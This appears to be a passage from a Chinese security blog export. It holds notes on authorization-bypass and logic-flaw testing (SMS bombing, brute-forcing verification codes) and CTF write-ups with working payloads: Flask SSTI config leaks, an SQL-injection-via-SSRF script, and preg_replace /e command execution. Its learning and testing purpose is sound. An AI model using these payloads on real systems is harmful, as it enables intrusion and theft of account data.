<h3 id="四、如何查找越权漏洞"><a href="#四、如何查找越权漏洞" class="headerlink" title="四、如何查找越权漏洞"></a>四、如何查找越权漏洞</h3><p>在与服务器进行数据交互时客户端携带着标识用户的身份的cookie，当服务端的session与cookie中的身份匹配成功后，才能允许该用户进行相关操作（cookie和session的关系–&gt;一弹、二弹）。除了cookie之外，在请求中可能会带一些参数，细览下可能存在辨别信息的唯一值，来进行测试。这里要说一点，传输的参数并不一定在请求参数中，也有可能存在URL链接的位置（GET和POST请求的区别）。当拦截一个请求后分析是否有参数：</p>
<p>1、请求中不存在参数，只用cookie进行身份验证，无法水平越权，可能出现垂直越权；</p>
<p>2、请求中存在参数，并且参数中的某些值可能是辨别信息的唯一值（如employeeID、departmentID、ID等），可能存在水平和垂直越权；越权的原因是参数中的employeeID没有判断是否是cookie中用户所管辖的员工ID。</p>
<h3 id="五、如何测试"><a href="#五、如何测试" class="headerlink" title="五、如何测试"></a>五、如何测试</h3><p>对于渗透测试，可以对一些请求进行抓包操作，或者查看请求的 URL 地址，对于关键的参数修改下值查看下返回结果来初步判定。随后可以注册两个小号，相互辅助来确定是否存在越权。</p>
<p>常见的越权高发功能点有：根据订单号查订单、根据用户 ID 查看帐户信息、修改 / 找回密码等。</p>
<p>对于代码审计，可以先查看前端的网页源码，查看一些操作的表单提交的值。查看配置文件和一些过滤器，看是否对 URL 有相关的筛选操作。最后查看后台处理逻辑，是否存在身份验证机制，逻辑是否异常，有时的逻辑漏洞也可导致越权操作。</p>
<p>一般测试时，可以注册两个小号测试，更方便，大概流程图如下：</p>
<p><img src="https://img-blog.csdnimg.cn/20181026095935634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x5YzE0MDEwNzAzMjA=,size_27,color_FFFFFF,t_70" alt="img"></p>
<h3 id="六、防范措施"><a href="#六、防范措施" class="headerlink" title="六、防范措施"></a>六、防范措施</h3><p>1、前后端同时对用户输入信息进行校验，双重验证机制</p>
<p>2、 执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限</p>
<p>3、特别敏感操作可以让用户再次输入密码或其他的验证信息。</p>
<p>4、可以从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。或在 session、cookie 中加入不可预测、不可猜解的 user 信息。</p>
<p>5、直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理<img src="https://img-blog.csdnimg.cn/20181026100238142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x5YzE0MDEwNzAzMjA=,size_27,color_FFFFFF,t_70" alt="img"></p>
]]></content>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>Web:逻辑漏洞</title>
    <url>/2021/05/24/web-luo-ji-lou-dong/</url>
    <content><![CDATA[<h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><p>在我理解中，逻辑漏洞是指由于程序逻辑输入管控不严，导致程序不能够正常处理或处理错误，一般出现在登录注册、密码找回、信息查看、交易支付金额等。</p>
<p><strong>我将所有逻辑漏洞的问题分为前端和后端两个部分，总体思路都是先测试前端再测试后端。**</strong>在我理解中其实就是能突破规则限制的就是漏洞【像不可修改的通过抓包可以修改了】。**</p>
<h3 id="一、注册处"><a href="#一、注册处" class="headerlink" title="一、注册处"></a>一、注册处</h3><p>注册功能可能出现任意用户注册、短信轰炸等问题。</p>
<p>配合思维导图（此处以常见的手机注册举例，同理其他注册也可以套用该模型）。</p>
<p><img src="https://image.3001.net/images/20190213/1550027987_5c638cd399b69.png!small" alt="img"></p>
<p>框里面是对每一个步骤的解释，框右边是总结的流程。（先不管图片验证码的原因是因为就算图片验证码可绕过，厂商也会因为该漏洞危害小而忽略）</p>
<h4 id="1、前端"><a href="#1、前端" class="headerlink" title="1、前端"></a>1、前端</h4><p>首先是前端，打开burpsuite，将整个注册流程走一遍，将每个步骤的包都右键标上不同颜色。</p>
<p>就像这样：</p>
<p><img src="https://image.3001.net/images/20190213/1550029287_5c6391e7b31f9.png!small" alt="img">查看每个返回包有没有返回手机验证码或者存在true、false之类的判断语句，尝试将false修改为true，成功注册的话就绕过了前端验证。</p>
<p>这样可以拦截该请求返回包：</p>
<p><img src="https://image.3001.net/images/20190214/1550122177_5c64fcc1a0720.png!small" alt="img"></p>
<h4 id="2、短信轰炸"><a href="#2、短信轰炸" class="headerlink" title="2、短信轰炸"></a>2、短信轰炸</h4><p>尝试重放发送验证码的包，查看手机是否在短时间内收到了多条短信，是的话则存在短信轰炸漏洞，这是因为后端没有对发送手机短信做时间限制。</p>
<h4 id="3、修改发送包手机号"><a href="#3、修改发送包手机号" class="headerlink" title="3、修改发送包手机号"></a><img src="https://image.3001.net/images/20190213/1550029681_5c6393716d14b.png!small" alt="img">3、修改发送包手机号</h4><p>最后是修改发送包的手机号，首先用自己的手机收到正确验证码，在点击注册时拦截包将手机号改为其他手机号，如果成功的话就注册了别人的手机号，这是因为后端仅验证了验证码是否是正确的而没有验证验证码是否与手机匹配。</p>
<p><img src="https://image.3001.net/images/20190214/1550121679_5c64facf4d378.png!small" alt="img"></p>
<p>流程小结</p>
<blockquote>
<p>1、前端判断【回显及判断】</p>
<p>2、短信轰炸</p>
<p>3、修改发送包手机号</p>
<p>【邮箱注册】4、修改发送包邮箱尝试覆盖注册</p>
</blockquote>
<p>以上是手机注册的大概框架流程，同理其他注册类型也可以对比测试。</p>
<h3 id="二、登录处"><a href="#二、登录处" class="headerlink" title="二、登录处"></a>二、登录处</h3><p>登录处可能出现任意用户登录、验证码可绕过、用户账号可撞库等问题。</p>
<p>配合思维导图，此处思维导图上说的密码也是手机验证码，因为是以手机验证码登录举例（此处以常见的手机验证码登录举例，同样账号密码登录也可以套用该模型，手机验证码登录的特殊处已用框标记）</p>
<p><img src="https://image.3001.net/images/20190214/1550117645_5c64eb0d7748c.png!small" alt="img">同样的，也是先测试前端再测试后端。</p>
<h4 id="1、前端-1"><a href="#1、前端-1" class="headerlink" title="1、前端"></a>1、前端</h4><p>首先对比正确登录和错误登录的包，对比返回包看是否有判断，尝试修改参数绕过前端验证。（这里也是打开burpsuite整个流程走一遍，和上面的注册处测试差不多）</p>
<h4 id="2、短信轰炸-1"><a href="#2、短信轰炸-1" class="headerlink" title="2、短信轰炸"></a>2、短信轰炸</h4><p>测试短信轰炸与注册处测试步骤一样（一般来说注册处有短信轰炸的话这里也会有）。</p>
<h4 id="3、验证码爆破"><a href="#3、验证码爆破" class="headerlink" title="3、验证码爆破"></a>3、验证码爆破</h4><p>再然后就是验证码爆破（或绕过），此处验证码包括图片验证码和手机验证码，先测试图片验证码，将使用正确密码登录的包再重放一次，如果回显还是正确登录的话说明并没有对图片验证码进行限制，可以尝试撞库。</p>
<p>至于手机验证码，通常是尝试爆破，如果网站发到手机上的短信没有写什么在xx时间内有效之类的则有可能没有时间限制，将登录包右键发送至Intruder（即测试器模块）设置好爆破位置后在载荷里选择数值后这样填写。</p>
<p><img src="https://image.3001.net/images/20190214/1550120969_5c64f8098cf06.png!small" alt="img">通常范围是填写正确验证码所在的范围，爆破出来可以登录用户，漏洞标题也就可以写任意用户登录漏洞。</p>
<h4 id="4、修改发送包手机号"><a href="#4、修改发送包手机号" class="headerlink" title="4、修改发送包手机号"></a>4、修改发送包手机号</h4><p>修改发送包手机号则和上面注册处修改发送包手机号步骤一样，不同的是上面注册处是为了测试任意用户注册，而这里登录处是为了测试任意用户登录，原理一样目的不同。</p>
<h4 id="5、修改用户参数"><a href="#5、修改用户参数" class="headerlink" title="5、修改用户参数"></a>5、修改用户参数</h4><p>查看正确登录包的返回包是否有用户id之类的参数，尝试修改该参数。（不嫌麻烦的话可以用两个正确登录的返回包对比）</p>
<p>拦截该请求的返回包修改返回包中的用户参数。</p>
<p>流程小结</p>
<blockquote>
<p>1、前端判断【回显及判断】</p>
<p>2、短信轰炸</p>
<p>3、验证码爆破</p>
<p>4、修改发送包手机号</p>
<p>5、尝试修改用户参数【注意token等参数】</p>
</blockquote>
<h3 id="三、密码找回处"><a href="#三、密码找回处" class="headerlink" title="三、密码找回处"></a>三、密码找回处</h3><p>密码找回处可能出现任意用户密码找回、验证码可绕过等问题。</p>
<p>密码找回处的思维导图，此处以手机验证码找回为例。</p>
<p><img src="https://image.3001.net/images/20190215/1550198850_5c6628422d72a.png!small" alt="img">这里也是先前端再后端。</p>
<h4 id="1、前端-2"><a href="#1、前端-2" class="headerlink" title="1、前端"></a>1、前端</h4><p>前端测试与前面一致，无非就是修改返回包看是否能跳过验证步骤，此处也就略过。</p>
<h4 id="2、验证码爆破"><a href="#2、验证码爆破" class="headerlink" title="2、验证码爆破"></a>2、验证码爆破</h4><p>第2步之所以没有写短信轰炸是因为前面注册和登录已经测试过了。</p>
<p>验证码爆破与上面登录处的验证码爆破操作一致。</p>
<h4 id="3、修改发送包手机号-1"><a href="#3、修改发送包手机号-1" class="headerlink" title="3、修改发送包手机号"></a>3、修改发送包手机号</h4><p>这里与上面注册处的修改发送包手机号操作一致，也就不多说了。</p>
<p>流程小结（其实精华都在思维导图上，其他的都是做解释，在最后我会把思维导图整体放上来）</p>
<blockquote>
<p>1、前端判断【回显及判断】</p>
<p>2、验证码爆破</p>
<p>3、修改发送包手机号或邮箱【提交时修改手机号或者修改验证码发送包的手机号】</p>
<p>4、【邮箱找回】链接尝试修改用户参数【注意token等参数】</p>
</blockquote>
<h3 id="四、支付与越权"><a href="#四、支付与越权" class="headerlink" title="四、支付与越权"></a>四、支付与越权</h3><p>这里放上思维导图。</p>
<p><img src="https://image.3001.net/images/20190215/1550200482_5c662ea2cbd66.png!small" alt="2$1(WJDQ4JDVMZDNN}TB%JD.png">这里之所以没有按先前端再后端的顺序来写，是因为几乎每个网站的支付和越权逻辑都不太一样，使用先前端再后端这样的框架的话就限制了思路。</p>
<p>在支付和越权这里我认为，只要有参数，都可以修改，都有可能出现问题。</p>
<p>通常我会使用两个账号来对比测试，这样可以更快发现可疑参数。</p>
<p>解释（有任何问题都可以留言，我会尽量解答，问题很多的话我会在过段时间的进阶篇里统一归纳整理）：</p>
<p>支付接口指的是网站支付一般会有像微信支付、支付宝支付这种，一般网站会在支付的发送包里用某个参数标识。</p>
<p>登录时查看并测试用户信息返回接口指的是，在登录的时候，有的网站有个返回包是一个json数据包，该包内包含了用户敏感信息，此时就可以尝试修改发送包的用户参数，说不定就能获取其他用户的敏感信息。 </p>
<h2 id="思维导图总览"><a href="#思维导图总览" class="headerlink" title="思维导图总览"></a>思维导图总览</h2><p><img src="/2021/05/24/web-luo-ji-lou-dong/9c4ad34c41464ed8972ca0abe7121b7.png" alt="9c4ad34c41464ed8972ca0abe7121b7"></p>
<p>参考：<a href="https://www.freebuf.com/articles/web/195837.html">https://www.freebuf.com/articles/web/195837.html</a></p>
]]></content>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>WesternCTF:2018-Shrine</title>
    <url>/2021/07/07/westernctf-2018-shrine/</url>
    <content><![CDATA[<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> flask
<span class="token keyword">import</span> os

app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span><span class="token operator">//</span>注册名为“flag”的config

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> open<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/shrine/&lt;path:shrine>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">shrine</span><span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span><span class="token operator">//</span>过滤config、self
        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'{{% set {}=None%}}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span> 
        <span class="token operator">+</span> s

    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>
<pre><code>/shrine/{{7*7}}</code></pre>
<p><img src="/2021/07/07/westernctf-2018-shrine/image-20210711160403714.png" alt="image-20210711160403714"></p>
<p>存在ssti漏洞</p>
<pre><code>/shrine/{{url_for.__globals__}}</code></pre>
<p><img src="/2021/07/07/westernctf-2018-shrine/image-20210711155833559.png" alt="image-20210711155833559"></p>
<pre><code>/shrine/{{url_for.__globals__['current_app'].config}}</code></pre>
<p><img src="/2021/07/07/westernctf-2018-shrine/image-20210711160013564.png" alt="image-20210711160013564"></p>
<p><strong>get_flashed_messages</strong></p>
<p>返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空</p>
<pre><code>/shrine/{{get_flashed_messages.__globals__['current_app'].config}}</code></pre>
<p><img src="/2021/07/07/westernctf-2018-shrine/image-20210711155441788.png" alt="image-20210711155441788"></p>
]]></content>
  </entry>
  <entry>
    <title>XCTF：Web-ics</title>
    <url>/2021/10/21/xctf-web-ics/</url>
    <content><![CDATA[<h1 id="ics-02"><a href="#ics-02" class="headerlink" title="ics-02"></a>ics-02</h1><p><img src="/2021/10/21/xctf-web-ics/1.png" alt="1"></p>
<p><img src="/2021/10/21/xctf-web-ics/2.png" alt="2"></p>
<p><img src="/2021/10/21/xctf-web-ics/3.png" alt="3"></p>
<p><strong>sql注入：</strong></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> random
<span class="token keyword">import</span> urllib

url <span class="token operator">=</span> <span class="token string">'http://111.198.29.45:52536/download.php'</span>

<span class="token comment" spellcheck="true"># subquery = "database()"</span>
<span class="token comment" spellcheck="true"># ssrfw</span>
<span class="token comment" spellcheck="true"># subquery = "select table_name from information_schema.tables where table_schema='ssrfw' LIMIT 1"</span>
<span class="token comment" spellcheck="true"># cetcYssrf</span>
<span class="token comment" spellcheck="true"># subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1"</span>
<span class="token comment" spellcheck="true"># secretname -> flag</span>
<span class="token comment" spellcheck="true"># subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1, 1"</span>
<span class="token comment" spellcheck="true"># value -> flag{cpg9ssnu_OOOOe333eetc_2018}</span>
subquery <span class="token operator">=</span> <span class="token string">"select value from cetcYssrf LIMIT 1"</span>

id <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000000</span><span class="token punctuation">)</span>

d <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'http://127.0.0.1/secret/secret_debug.php?'</span> <span class="token operator">+</span>
        urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token string">"s"</span><span class="token punctuation">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span>
            <span class="token string">"txtfirst_name"</span><span class="token punctuation">:</span> <span class="token string">"L','1',("</span><span class="token operator">+</span>subquery<span class="token operator">+</span><span class="token string">"),'1'/*"</span><span class="token punctuation">,</span>
            <span class="token string">"txtmiddle_name"</span><span class="token punctuation">:</span> <span class="token string">"m"</span><span class="token punctuation">,</span>
            <span class="token string">"txtLast_name"</span><span class="token punctuation">:</span> <span class="token string">"y"</span><span class="token punctuation">,</span>
            <span class="token string">"txtname_suffix"</span><span class="token punctuation">:</span> <span class="token string">"Esq."</span><span class="token punctuation">,</span>
            <span class="token string">"txtdob"</span><span class="token punctuation">:</span> <span class="token string">"*/,'01/10/2019"</span><span class="token punctuation">,</span>
            <span class="token string">"txtdl_nmbr"</span><span class="token punctuation">:</span> id<span class="token punctuation">,</span>
            <span class="token string">"txtRetypeDL"</span><span class="token punctuation">:</span> id
            <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;"</span><span class="token punctuation">)</span>


r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"dl"</span><span class="token punctuation">:</span> d<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><p>dirsearch扫描出index.php/login</p>
<p>进入有个?page</p>
<pre><code>php://filter/read=convert.base64-encode/resource=index.php</code></pre>
<p><strong>index.php:</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">echo</span> <span class="token string">"&lt;br >Welcome My Admin ! &lt;br >"</span><span class="token punctuation">;</span>

<span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pat<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$replacement</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>rep<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$subject</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>sub<span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$replacement</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$subject</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$replacement</span><span class="token punctuation">,</span> <span class="token variable">$subject</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p><strong>preg_replace($pattern, $replacement, $subject)</strong></p>
<ul>
<li>作用：搜索subject中匹配pattern的部分， 以replacement的内容进行替换。</li>
<li>$pattern:       要搜索的模式，可以是字符串或一个字符串数组。</li>
<li>$replacement:   用于替换的字符串或字符串数组。</li>
<li>$subject:       要搜索替换的目标字符串或字符串数组。</li>
</ul>
<p>subject中有要搜索的pattern的内容，同时将在replacement前加上/e，触发/e漏洞，就可以执行replacement中的正确的php代码</p>
<pre><code>?pat=/1/e&amp;rep=system('cd%20s3chahahaDir/flag%26%26%20ls')&amp;sub=1</code></pre>
<p><img src="/2021/10/21/xctf-web-ics/4.png" alt="4"></p>
<pre><code>?pat=/1/e&amp;rep=system("cat%20s3chahahaDir/flag/flag.php")&amp;sub=1</code></pre>
<p><img src="/2021/10/21/xctf-web-ics/5.png" alt="5"></p>
<h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><p>扫描后台</p>
<p>id爆破</p>
<p>字典生成：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> m <span class="token keyword">in</span>  range <span class="token punctuation">(</span><span class="token number">100001</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre>
<h1 id="ics-07"><a href="#ics-07" class="headerlink" title="ics-07"></a>ics-07</h1><p>view-source</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>page<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>page<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>page<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: ?page=flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token delimiter">?></span>

    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
      page <span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>page<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
      id <span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.phps<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>view<span class="token operator">-</span>source<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>

    <span class="token delimiter">&lt;?php</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'con'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
       <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
       <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"backup/"</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">;</span>

       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/.+\.ph(p[3457]?|t|tml)$/i'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
          <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Bad file extension"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'uploaded'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
     <span class="token delimiter">?></span>

    <span class="token delimiter">&lt;?php</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">floatval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'1'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span>
        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
